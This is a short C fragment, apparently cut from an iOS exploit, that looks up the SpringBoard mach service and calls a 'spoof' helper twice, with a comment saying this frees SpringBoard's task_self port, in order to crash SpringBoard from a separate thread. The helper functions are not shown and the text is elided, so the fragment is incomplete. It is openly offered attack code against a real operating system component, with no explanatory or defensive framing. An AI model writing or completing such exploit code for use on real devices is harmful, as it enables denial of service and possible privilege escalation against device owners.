...
static void* kill_springboard_thread(void* arg){
    mach_port_t service_port = lookup("com.apple.SpringBoard");
    
    // free task_self in springboard
    for (int j = 0; j < 2; j++) {
        spoof(service_port, 0x103);
    }
...
void kill_springboard() {
    pthread_t t;
    pthread_create(&t, NULL, kill_springboard_thread, NULL);
}
